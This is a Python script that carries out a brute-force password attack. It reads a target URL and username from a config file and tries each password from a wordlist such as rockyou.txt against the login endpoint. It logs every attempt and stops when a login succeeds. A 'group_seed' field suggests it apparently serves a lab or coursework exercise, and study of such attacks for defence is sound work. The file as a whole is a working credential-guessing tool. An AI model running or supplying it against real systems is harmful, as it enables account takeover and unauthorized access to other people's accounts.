import requests
import time
import datetime
import json
import os
import sys

CONFIG_FILE = "attacker_config.json"


def load_config():
    if not os.path.exists(CONFIG_FILE):
        raise FileNotFoundError(f"Config file '{CONFIG_FILE}' not found")
    with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
        return json.load(f)


def init_log_file(log_file):
    try:
        # Open in append mode just to create it if it doesn't exist
        with open(log_file, 'a', encoding='utf-8'):
            pass
    except Exception as e:
        print(f"Error initializing log file: {e}")


def log_attempt(config, username, password, status_code, result, latency, attack_type):
    log_entry = {
        "timestamp": datetime.datetime.now().isoformat(),
        "group_seed": config["group_seed"],
        "username": username,
        "password_attempt": password,
        "attack_type": attack_type,
        "status_code": status_code,
        "result": result,
        "latency_ms": float(f"{latency:.3f}")
    }

    try:
        with open(config["log_file"], 'a', encoding='utf-8') as f:
            f.write(json.dumps(log_entry) + "\n")
    except Exception as e:
        print(f"Error writing to log: {e}")


def load_password_list(file_path, max_attempts=None):
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"Password file '{file_path}' not found")

    passwords = []
    try:
        # Try different encodings to handle files like rockyou.txt
        for encoding in ['utf-8', 'latin-1']:
            try:
                with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
                    # Strip whitespace and ignore empty lines
                    passwords = [line.strip() for line in f if line.strip()]
                break
            except UnicodeDecodeError:
                continue

        if max_attempts and max_attempts > 0:
            passwords = passwords[:max_attempts]

        print(f"Loaded {len(passwords)} passwords from {file_path}")
        return passwords
    except Exception as e:
        print(f"Error reading password file: {e}")
        sys.exit(1)


def attempt_login(config, username, password, attack_type):
    start_time = time.time()
    status_code = 0
    result = "ERROR"

    try:
        response = requests.post(
            config["target_url"],
            json={"username": username, "password": password},
            timeout=config.get("request_timeout", 5)
        )
        status_code = response.status_code
        # 200 OK or 401 Unauthorized
        result = "SUCCESS" if status_code == 200 else "FAILURE"
    except requests.exceptions.RequestException as e:
        print(f"Connection Error: {e}")

    end_time = time.time()
    latency_ms = (end_time - start_time) * 1000
    log_attempt(config, username, password, status_code, result, latency_ms, attack_type)

    print(f"Status: {status_code} | User: {username} | Pass: {password} | ({latency_ms:.3f}ms)")
    return result == "SUCCESS"


def run_brute_force(config):
    target_user = config["target_username"]
    password_file = config["password_file"]
    max_attempts = config.get("max_attempts", 0)
    print(f"Starting brute force attack on user: {target_user}")
    passwords = load_password_list(password_file, max_attempts)
    for password in passwords:
        is_success = attempt_login(config, target_user, password, "Brute-Force")
        if is_success:
            print(f"SUCCESS! PASSWORD FOUND: {password}")
            break
    print("Brute force attack finished")


if __name__ == "__main__":
    config = load_config()
    init_log_file(config["log_file"])
    run_brute_force(config)
